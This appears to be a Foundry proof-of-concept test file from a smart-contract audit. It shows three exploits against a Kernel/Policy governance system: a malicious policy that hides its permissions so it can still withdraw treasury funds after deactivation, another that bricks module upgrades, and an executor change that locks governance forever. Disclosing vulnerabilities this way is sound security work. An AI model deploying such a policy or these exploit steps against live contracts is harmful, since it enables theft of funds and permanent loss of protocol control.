// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {Kernel, Actions, Policy, Module, Permissions, Keycode} from "src/Kernel.sol";
import {Treasury} from "src/modules/Treasury.sol";

// MOCK MALICIOUS POLICY
contract StealthPolicy is Policy {
    bool public goDark;
    
    constructor(Kernel _k) Policy(_k) {}

    function configureDependencies() external override returns (Keycode[] memory deps) {
        if (goDark) revert("ZOMBIE_MODE_ENGAGED"); // V#2: Brick dependency pruning
        return new Keycode[](0);
    }

    function requestPermissions() external view override returns (Permissions[] memory requests) {
        if (goDark) {
            // V#1: Return EMPTY list to trick Kernel into not revoking anything
            return new Permissions[](0);
        }
        // Normal behavior: Request Treasury Access
        requests = new Permissions[](1);
        requests[0] = Permissions(Keycode.wrap("TRSRY"), Treasury.withdraw.selector);
    }
    
    function setDark(bool _b) external { goDark = _b; }
}

contract OlympusCriticals is Test {
    Kernel kernel;
    Treasury treasury;
    StealthPolicy attackPolicy;
    
    function setUp() public {
        kernel = new Kernel();
        treasury = new Treasury(kernel);
        attackPolicy = new StealthPolicy(kernel);
        
        // Setup Kernel & Install Modules
        kernel.executeAction(Actions.InstallModule, address(treasury));
        kernel.executeAction(Actions.ActivatePolicy, address(attackPolicy));
    }

    // 🧪 TEST 1: Ghost Permissions (Theft)
    // Prove that an Inactive Policy can still call restricted functions
    function test_Exploit_GhostPermissions() public {
        // 1. Arm the trap (Policy decides to hide permissions)
        attackPolicy.setDark(true);
        
        // 2. Admin Deactivates Policy (Expecting revocation)
        kernel.executeAction(Actions.DeactivatePolicy, address(attackPolicy));
        
        // 3. CHECK: Policy is technically "Inactive"
        assertFalse(attackPolicy.isActive(), "Policy should be inactive");
        
        // 4. EXPLOIT: Call restricted function
        // This SHOULD fail, but succeeds because permissions weren't cleared
        vm.prank(address(attackPolicy));
        treasury.withdraw(address(0x1337), 1000e18);
        
        console.log("SUCCESS: Funds stolen by Inactive Policy!");
    }

    // 🧪 TEST 2: Zombie Policy (Upgrade Deadlock)
    // Prove that a single bugged policy blocks global upgrades
    function test_Exploit_UpgradeDeadlock() public {
        // 1. Arm the trap (Policy will revert on dependency config)
        attackPolicy.setDark(true);
        
        // 2. Admin attempts to Upgrade Treasury (New implementation)
        Treasury newTreasury = new Treasury(kernel);
        
        // 3. EXPLOIT: The upgrade reverts because it calls the Zombie Policy
        vm.expectRevert("ZOMBIE_MODE_ENGAGED");
        kernel.executeAction(Actions.UpgradeModule, address(newTreasury));
        
        console.log("SUCCESS: Protocol Upgrade Bricked!");
    }
    
    // 🧪 TEST 3: Governance Suicide
    // Prove that the executor can be set to a non-existent contract
    function test_Exploit_GovBricking() public {
        address deadAddress = address(0xDEAD); // No code, no keys
        
        // 1. EXPLOIT: No ensureContract check
        kernel.executeAction(Actions.ChangeExecutor, deadAddress);
        
        // 2. Verify Bricking
        assertEq(kernel.executor(), deadAddress);
        
        // 3. Try to rescue (Fail)
        vm.startPrank(address(this)); // Old executor
        vm.expectRevert(); // Not authorized anymore
        kernel.executeAction(Actions.ChangeExecutor, address(this));
        vm.stopPrank();
        
        console.log("SUCCESS: Governance Permanently Lost!");
    }
}
